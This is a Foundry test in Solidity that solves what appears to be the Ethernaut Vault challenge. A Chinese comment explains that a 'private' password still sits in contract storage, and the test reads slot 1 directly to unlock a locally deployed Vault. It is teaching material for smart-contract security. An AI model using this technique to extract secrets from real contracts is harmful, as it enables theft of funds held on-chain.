pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";


/** 
 * 解题思路：虽然 password 是私有的，但是还是可以直接从合约的存储中加载数据
 * 合约的存储结构：
 * 1. 由 2 ** 256 个 slot 组成
 * 2. 每个 slot 大小为 32 byte
 * 3. 变量存储的顺序和声明的顺序一致
 * 4. 变量存储会自动优化，如果相邻的变量刚好可以组成 32 byte 大小，那么就会被打包进一个 slot
 */
contract HackVaultTest is Test {
    address hacker = address(hacker);
    Vault public p;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        p = new Vault("123");
    }
    function testHackVault() public {
        vm.startPrank(hacker);
        bytes32 pwd = vm.load(address(p), bytes32(uint256(1)));
        p.unlock(pwd);
        
        console.log("Vault locked:");
        console.logBool(p.locked());
        vm.stopPrank();
    }
}